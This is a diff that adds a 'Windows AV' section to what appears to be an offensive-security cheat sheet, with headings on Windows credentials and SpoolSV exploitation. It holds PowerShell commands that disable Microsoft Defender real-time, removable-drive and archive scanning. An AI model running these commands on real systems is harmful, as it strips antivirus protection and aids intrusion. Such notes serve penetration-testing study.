@@ -1,3 +1,12 @@
+# Windows AV
+
+```powershell
+Set-MpPreference	-DisableRealtimeMonitoring	$true
+Set-MpPreference	-DisableRemovableDriveScanning	$true
+Set-MpPreference	-DisableArchiveScanning	$true
+Get-MpComputerStatus
+```
+
 # Windows Credential
 
 ## SpoolSV Exploitation
